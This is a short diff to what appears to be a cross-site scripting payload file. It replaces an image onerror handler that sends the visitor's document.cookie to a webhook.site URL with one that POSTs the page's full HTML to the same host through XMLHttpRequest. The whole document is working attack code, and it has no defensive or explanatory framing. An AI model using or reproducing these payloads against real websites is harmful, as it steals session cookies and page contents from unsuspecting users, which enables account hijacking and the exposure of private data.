@@ -1,1 +1,7 @@
-<img src=x onerror="fetch('https://webhook.site/5a7fb9d6-f113-4dd7-a31f-7f23c6bca274/?c='+document.cookie)">
+<img src=x onerror="
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://webhook.site/5a7fb9d6-f113-4dd7-a31f-7f23c6bca274', true);
+  xhr.setRequestHeader('Content-Type', 'text/plain');
+  xhr.send(document.body.innerHTML);
+">
+
